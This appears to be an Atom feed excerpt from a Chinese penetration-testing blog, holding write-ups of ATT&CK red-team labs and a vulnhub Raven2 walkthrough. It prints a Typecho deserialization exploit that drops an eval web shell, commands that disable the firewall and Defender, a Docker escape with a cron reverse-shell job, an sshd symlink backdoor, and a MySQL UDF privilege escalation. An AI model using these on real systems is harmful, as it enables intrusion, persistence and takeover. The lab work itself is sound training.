&lt;li&gt;&lt;p&gt;DMZ区IP段为192.168.1.1&amp;#x2F;24 复制物理机网络&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第二层网络环境IP段为192.168.52.1&amp;#x2F;24&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第三层网络环境IP段为192.168.93.1&amp;#x2F;24&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;网络设置&quot;&gt;&lt;a href=&quot;#网络设置&quot; class=&quot;headerlink&quot; title=&quot;网络设置&quot;&gt;&lt;/a&gt;网络设置&lt;/h2&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场06</title>
    <link href="https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/"/>
    <id>https://syst1m.top/2022/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA06/</id>
    <published>2022-08-23T08:04:30.000Z</published>
    <updated>2022-08-25T08:54:36.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png"></p><p>首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS<br>接着是linux就开放了一个22端口，服务嘛啥也没有</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V<span class="number">3.2</span></span><br><span class="line">web\de<span class="number">1</span>ay | <span class="number">1</span>qaz<span class="title">!QAZ1qaz</span><span class="title">!QAZ</span></span><br><span class="line">de<span class="number">1</span>ay\de<span class="number">2</span>ay | <span class="number">1</span>qaz<span class="title">@WSX</span><span class="title">!QAZ2wsx</span></span><br></pre></td></tr></table></figure><p>首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改ip设置</p><p>扫下端口开放情况，只开发了80,3306，这里的80使用phpstudy起的一个typecho</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231618206.png"></p><p>打开发现报错</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231625116.png"></p><p>进入靶机打开phpstudy启动服务，先关闭iis，在删除网站根目录的config.inc.php，重新安装typecho，先进入数据库新建一个typecho的库，然后访问如下url，进行重新安装</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231627616.png"></p><p>然后又报了一个类错误，直接从官网从新下一个，2017年10月24日之前的所有版本都存在此靶场要利用的漏洞</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="typecho反序列化前台getshell"><a href="#typecho反序列化前台getshell" class="headerlink" title="typecho反序列化前台getshell"></a>typecho反序列化前台getshell</h2><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;echo ^&lt;?php @eval($_POST[&quot;b1ank&quot;]);?^&gt;&gt;shell.php&#x27;</span>; <span class="comment">// 执行的参数值</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;system&#x27;</span>; <span class="comment">//filter执行的函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>; <span class="comment">//进入toString内部判断条件</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_type = <span class="built_in">self</span>::<span class="variable constant_">RSS2</span>;</span><br><span class="line">            <span class="variable">$_item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(); <span class="comment">//Feed.php文件中触发__get()方法使用的对象</span></span><br><span class="line">        <span class="variable">$_item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>());<span class="comment">//触发错误</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$_item</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;adapter&#x27;</span>=&gt;<span class="variable">$exp</span>, <span class="comment">// Db.php文件中触发__toString()使用的对象</span></span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt;<span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用post提交数据<br>url：<a href="http://192.168.31.10/typecho/install.php?finish=a">http://192.168.31.10/typecho/install.php?finish=a</a><br>Postdata：__typecho_config&#x3D;前面脚本生成的<br>Referrer：<a href="http://192.168.31.10/typecho">http://192.168.31.10/typecho</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231707526.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>连上蚁剑，上线到cs提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231716241.png"></p><p>信息收集发现还有一个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231718366.png"></p><p>探测10网段存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231719352.png"></p><p>看很多文章后面就是mimikatz抓取明文密码，然后域横向，但是我这里mimikatz根本没有抓到明文密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208231810645.png"></p><p>这个环境没搞懂，应该还有很多内容，没这么简单的</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208231614969.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先是WEB它有3个快照分别对应的是iis、weblogic、typechoCMS&lt;br&gt;接着是linux就开放了一个22端口，服务嘛啥也没有&lt;/p&gt;
&lt;figure class=&quot;highlight llvm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;V&lt;span class=&quot;number&quot;&gt;3.2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;web\de&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;ay | &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;qaz&lt;span class=&quot;title&quot;&gt;!QAZ1qaz&lt;/span&gt;&lt;span class=&quot;title&quot;&gt;!QAZ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;de&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;ay\de&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;ay | &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;qaz&lt;span class=&quot;title&quot;&gt;@WSX&lt;/span&gt;&lt;span class=&quot;title&quot;&gt;!QAZ2wsx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;首先要进入web靶机启动phpstudy，它这里ip是写死的静态ip，如果要修改需要进入web\de1ay账号修改ip设置&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场05</title>
    <link href="https://syst1m.top/2022/08/19/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA05/"/>
    <id>https://syst1m.top/2022/08/19/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA05/</id>
    <published>2022-08-19T01:40:49.000Z</published>
    <updated>2022-08-19T03:02:44.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>虚拟机密码<br>win7</p><p>sun\heart 123.com</p><p>sun\Administrator dc123.com</p><p>2008</p><p>sun\admin 2020.com</p><p>Win7双网卡模拟内外网，这里我为了方便将win7的外网网卡设置为复制物理机网络并dhcp，和攻击机kali处于一个网段，进入win7启动c盘下的phpstudy</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h2><p>对外网web靶机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208190948121.png"></p><p>看看web服务，tp5不多说了，掏出tp大杀器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208190952037.png"></p><p>直接用工具getshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208190957533.png"></p><p>上蚁剑，信息收集,发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191003798.png"></p><p>存在域</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191006155.png"></p><p>定位域控</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191007293.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>生成一个无文件落地后门，上线到cs上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191013567.png"></p><p>发现一直没有上线，应该是开了防火墙，先关闭防火墙再看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment">#关闭防火墙</span></span><br><span class="line">net stop windefend <span class="comment">#关闭windefebd</span></span><br><span class="line">bcdedit.exe /set&#123;current&#125; nx AlwaysOff <span class="comment">#关闭DEP</span></span><br></pre></td></tr></table></figure><p>成功上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191022162.png"></p><p>创建一个smb监听器，提权到system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191026280.png"></p><p>扫描内网存活主机，进行横向移动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191046716.png"></p><p>对dc进行横向，等一会拿到dc权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208191050225.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;虚拟机密码&lt;br&gt;win7&lt;/p&gt;
&lt;p&gt;sun\heart 123.com&lt;/p&gt;
&lt;p&gt;sun\Administrator dc123.com&lt;/p&gt;
&lt;p&gt;2008&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场04</title>
    <link href="https://syst1m.top/2022/08/16/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA04/"/>
    <id>https://syst1m.top/2022/08/16/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA04/</id>
    <published>2022-08-16T03:10:25.000Z</published>
    <updated>2022-08-17T02:51:04.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>账号密码</p><ul><li>web ubuntu:ubuntu     </li><li>域成员 douser:Dotest123 </li><li>DC administrator:Test2008</li></ul><p>环境为kali复制物理网络，ubuntu复制物理网络&#x2F;仅主机，其余都为仅主机</p><h1 id="拓补图"><a href="#拓补图" class="headerlink" title="拓补图"></a>拓补图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161117759.png"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对ubuntu进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161124388.png"></p><h2 id="S2"><a href="#S2" class="headerlink" title="S2"></a>S2</h2><p>挨个访问，2001端口根据title可以看到是Struts2框架</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161126930.png"></p><p>掏出检测工具,存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161138940.png"></p><p>exp直接拿下root权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161153328.png"></p><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>2002端口tomcat，想war写马但是403</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161128199.png"></p><p>检测到存在cve-2017-12615</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161201997.png"></p><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>2003端口phpmyadmin未授权,首先想到的是写通过日志写马，但是没有权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161128518.png"></p><p>网上找到4.8.1版本存在文件包含漏洞，可以通过写入缓存文件来getshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161224429.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161237172.png"></p><p>复现连接<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p>然后在test库中查询，写入session缓存，然后再包含这个session文件来getshell，不知道为什么我本地根本没有生成这个session文件，已经拿到两个root权限的shell，不影响</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161314665.png"></p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>根据拿到的shell收集信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161321337.png"></p><p>判断是否为docker环境</p><p>ls -alh &#x2F;.dockerenv #查看是否存dockerrnv文件<br>cat &#x2F;proc&#x2F;1&#x2F;cgroup #查看系统进程的cgroup信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161321490.png"></p><p>此处利用特权模式逃逸，创建容器时通过添加–privileged&#x3D;true参数，将容器以特权模式起动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name privilegeTest –-privileged=<span class="literal">true</span> mongo:3.6-streth</span><br></pre></td></tr></table></figure><p> 特权模式起动的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起）这里tomcat容器是特权模式启动的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161431272.png"></p><p>fdisk -l #查看磁盘文件<br>mkdir &#x2F;chan #新建一个目录用于挂载<br>mount &#x2F;dev&#x2F;sda1 &#x2F;chan #将宿主机&#x2F;dev&#x2F;sda1目录挂载到容器内</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161433483.png"></p><p>再利用计划任务反弹shell，这种半交互式shell，走web协议在写计划任务的时候会有很多转义问题，直接写webshell到根目录也出各种问题，于是用kali起了一个web服务把webshell放进去，让这个tomcat容器去下载</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161511233.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161511479.png"></p><h2 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h2><p>写入反弹语句</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161517957.png"></p><p>写到计划任务里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/shell.sh &#x27;</span> /chan/etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /chan/etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161521524.png"></p><p>kali成功收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161521969.png"></p><p>构造ssh软连接后门，做权限维持</p><p>软连后门需要root执行后门命令，任意密码登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161604297.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161522665.png"></p><p>弹一个会话到msf上，方便内网渗透,直接用msf自带的webshell比去生成后门再上传方便很多，</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161540400.png"></p><p>将生成的连接复制到刚刚返弹的shell中执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161540889.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161542230.png"></p><p>拿到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161543354.png"></p><p>添加到40网段的路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161547033.png"></p><p>使用kali自带的模块再对40网段存活主机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161617099.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161618476.png"></p><p>再进行端口探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161622111.png"></p><h2 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h2><p>开放了445端口尝试17010，这里要创建一个正向连接的payload，因为我们无法直接与靶机通信，反向连接的话靶机无法连接到kali</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161628372.png"></p><p>ms17-010打过去不返回会话，不知道管理员密码，作弊直接上去反弹shell，是域用户不是system运行不了mimikatz</p><p>直接寄了，后面的流程就是打到域用户，然后抓取hash制作TGT票据，然后用ms14-068打到域控，制作黄金票据维持权限</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;账号密码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;web ubuntu:ubuntu     &lt;/li&gt;
&lt;li&gt;域成员 douser:Dotest123 &lt;/li&gt;
&lt;li&gt;DC administrator:Test2008&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;环境为kali复制物理网络，ubuntu复制物理网络&amp;#x2F;仅主机，其余都为仅主机&lt;/p&gt;
&lt;h1 id=&quot;拓补图&quot;&gt;&lt;a href=&quot;#拓补图&quot; class=&quot;headerlink&quot; title=&quot;拓补图&quot;&gt;&lt;/a&gt;拓补图&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Raven2打靶</title>
    <link href="https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/</id>
    <published>2022-08-13T10:12:55.000Z</published>
    <updated>2022-08-14T03:24:52.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png"></p><p>扫一下目录，扫到一个目录遍历</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png"></p><p>拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131829833.png"></p><p>找到版本信息 phpmailer5.2.16</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131830372.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>根据版本信息找一下利用文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131832070.png"></p><p>-m id 下载到本地</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131843406.png"></p><p>修改脚本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131854768.png"></p><p>再起一个终端监听</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131850579.png"></p><p>使用python运行脚本，访问后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904663.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904435.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131905706.png"></p><p>用py返回一个半交互式shell，找到第二个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141044792.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux提权三板斧，suid，sudo无密码，内核皆无果</p><p>尝试其他方式，看看网站配置文件wp-config.php，找到mysql密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141048058.png"></p><p>有mysql的root账号我们可以使用udf提权，但是需要secure_file_priv的值不为null或者不做限制</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141052878.png"></p><p>没有导入导出限制，查看mysql版本和主机版本、架构</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141055131.png"></p><p>下载利用文件来提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141107997.png"></p><p>编译下载好的利用文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o 1.so 1518.o -lc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141108499.png"></p><p>再在kali用python起一个web服务，靶机下载利用到本地提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141112443.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141113459.png"></p><p>进入mysql，构造自定义函数，给find一个s权限也就是suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/111.so&#x27;));   //上传到哪就写哪</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/111.so&#x27;;   //这个和上一行不是一个路径嗷，要根据前面进程列出来的plugin目录进行改动（一般就是这个）</span><br><span class="line">create function do_system returns integer soname &#x27;111.so&#x27;;     //创建 do_system 函数调用</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);     //给find命令赋予suid权限</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141120336.png"></p><p>退出mysql，利用find返回一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141123993.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;扫一下目录，扫到一个目录遍历&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="udf提权" scheme="https://syst1m.top/tags/udf%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>vuln-Momentum2打靶</title>
    <link href="https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/</id>
    <published>2022-07-27T13:47:49.000Z</published>
    <updated>2022-07-27T16:21:41.520Z</updated>
    
